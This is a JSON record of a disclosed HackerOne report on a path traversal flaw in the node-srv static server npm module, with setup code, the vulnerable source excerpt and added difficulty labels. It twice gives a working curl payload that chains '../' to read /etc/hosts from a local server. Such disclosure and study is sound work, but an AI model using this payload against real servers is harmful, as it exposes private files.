{
  "reported_to": "Node.js third-party modules",
  "reported_by": "bl4de ",
  "title": "[node-srv] Path Traversal allows to read arbitrary files from remote server",
  "content": "\nHi Guys,\nnode-srv contains Path Traversal vulnerability, which allows malicious user to read content of any file with known path.\nModule:\nSimple static node.js server. Supports Heroku and Grunt.js\nhttps://www.npmjs.com/package/node-srv\nDescription\nnode-srv does not sanitize path in the correct way, so curl can be used to retrieve content of any file from the remote server.\nSteps To Reproduce:\ninstall node-srv\nCode 22 Bytes\n1$ npm install node-srv\ncreate simple server:\nCode 195 Bytes\n1//Require module \n2var Server = require('node-srv');\n3\n4// Start server \n5var srv = new Server({\n6    port: 8080,\n7    root: './',\n8    logs: true\n9}, function () {\n10    console.log('Server stopped');\n11});\nrun server:\nCode 13 Bytes\n1$ node app.js\nvisit http://127.0.0.1:8080 to verify if everything is fine.\nnow, run following curl command (please adjust numbers of ../ to your system):\nCode 82 Bytes\n1$ curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/hosts\nYou should see the content of /etc/hosts file:\n<image_0>\nThe problem is that url read from the user is not sanitize in any way against classic ../ path traversal payload:\nCode 569 Bytes\n1return new Promise((function(_this) {\n2        return function(resolve, reject) {\n3          var uri;\n4          uri = url.parse(req.url);\n5          return resolve(uri.pathname);\n6        };\n7      })(this)).then((function(_this) {\n8        return function(pathname) {\n9          filePath = pathname;\n10          filePath = filePath.replace(/\\/$/, \"/\" + _this.options.index);\n11          filePath = filePath.replace(/^\\//, \"\");\n12          filePath = path.resolve(process.cwd(), _this.options.root || './', filePath);\n13          return _this.processRequest(res, filePath);\n14        };\nSupporting Material/References:\nConfiguration I've used to find this vulnerability:\nmacOS HighSierra 10.13.3\nnode 8.9.3\nnpm 5.5.1\ncurl 7.54.0\nWrap up\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\nThank you\nRegards,\nRafal 'bl4de' Janicki\nImpact\nThis vulnerability allows malicious user to read content of any file on the server, which leads to data breach or other attacks.\n\n",
  "severity": [
    8.6,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/257/357/cc175260921e87d336fdc1722a155babaa20deeb/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSSP3QJG2%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T174633Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC3KYa8%2Bjx2WYWS6PUb%2Br9nud2898Z1NBWvHtqsijwb5QIgbw%2FfERMuBo5k43cHzydjgHWn8kWRfrCw1kkfUAldw38qsQUIMhADGgwwMTM2MTkyNzQ4NDkiDFq3Zp19llp9Pe7h3yqOBVI8srwPEsePGqvQQSvtWFGomAhew1kmXl64o4B0%2FdCJVZPp5BLBysYZJVUbSB0kXT2FxEXMimtFXezxylPEdKDRCbcF90vYNaEjLEEFFj6f5Xl%2BgooEJaBofIBHWBfxhQZWmd%2F0C5HF%2BgDQpAA8aRbZBJnBt%2BTxm8Y%2F3RC5MWrx0E3%2FfeXGgQrxRmBUpPiMgtEvMeZ%2BC4LJvyP6XXW6wJOPLuG6Qc2CoJ2JCkFV1PR2r2xPmkC4l9rOpCdGGs4goJlj0gTyU0z%2FOe%2B2VCymyuoJVsgMdWZ8vFCqgxDR7ICmfa8oMcNnTLcmXrhUqOZgtqUHROOJ%2FaupQsOy228pTZ7dNH7HbWcgd3PvnxeTC07UM9v14%2FIoY9NJVPt7JclBsdrK7XJGxYG6khdKbLJHML94UNV3x6iANK93UkD%2FJRWgaghK%2Bfx%2FEM%2Fep0YY9byi98oebN8T5fJSQJh5yjx3HxW03F0wDRfXqHx6szUjqHoRWoAHOMQI%2BKL2toiGXLoYdCPAv7sIEucY6QU6n%2Fq%2FD%2Bq5%2B9AMVZ2zhASsL7FWuKv4VfMpqvsoOP72gBpuUpQmL%2B1ufaHLMc3IwT9j3yGRXj6alhxnYqo4CzannVC3qrhqVOKT%2FkZ97L%2FVnxURY9jgcsT0jOkYsznUG7OwaCtlsOxno8S8ZXcxz%2Blo9AlIvTciNGQtWN7NiQKO0v1MogkxEHUH33IpDiYgZ9bEMQEl%2BegldhcMHRWdwkaL8%2F%2FCdi94vByuQZS0yM4Uh9Uc3FOVUaJ7yy2QOMkRH8ZFNEZU7Dxm6lS%2FnIpBMheItdtNygMLzMWQepfjMt4YJ0DAMi4%2F6K0xY10RjHfTvip2sBSqP%2Fdh2s09q9ydz6%2BZ5aKiKTCm3JC%2FBjqxAWh2R3WTw90sQcz5k33F4ENG72PDMCNB9uGhMQHBL%2FW41qfmDLbeRe0kIu6%2BUlF1zsdWyXxoorodUcBH8jrkBwohGhVcJdHUBggX1TiG6VeyZOXcc4bAPKpxZhZohu4vsjVsh7rX0cfqHLGf3TqYc6fjaqCFgxnKgo9xYMuoLEIXleV24azkQHidXx005b8yqLO6DluU5SeiynXb%2FK0dQTRFuMzTLPXwz7M5350NDsoXLA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=481cc277c488fc8c02713d3b36843a72af09ed6cac711b6b0b6b475ac0e0f3f2"
  },
  "disclosed_date": 1520454780,
  "report_url": "https://hackerone.com/reports/309124",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install node-srv: $ npm install node-srv"
    ],
    [
      2,
      "Create and run a simple server using the provided code snippet"
    ],
    [
      3,
      "Verify server is running by visiting http://127.0.0.1:8080"
    ],
    [
      4,
      "Exploit the vulnerability using curl: $ curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/hosts"
    ]
  ],
  "vuln_description": "The node-srv module contains a Path Traversal vulnerability that allows a malicious user to read the content of any file on the server by manipulating the path in the URL. This is due to insufficient sanitization of the path provided by the user, enabling access to files outside the intended directory.",
  "reason": "The vulnerability is straightforward to exploit once the server is set up, requiring only basic knowledge of path traversal techniques. The attack does not involve multiple components, complex states, or novel logic, making it easy to discover and execute.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}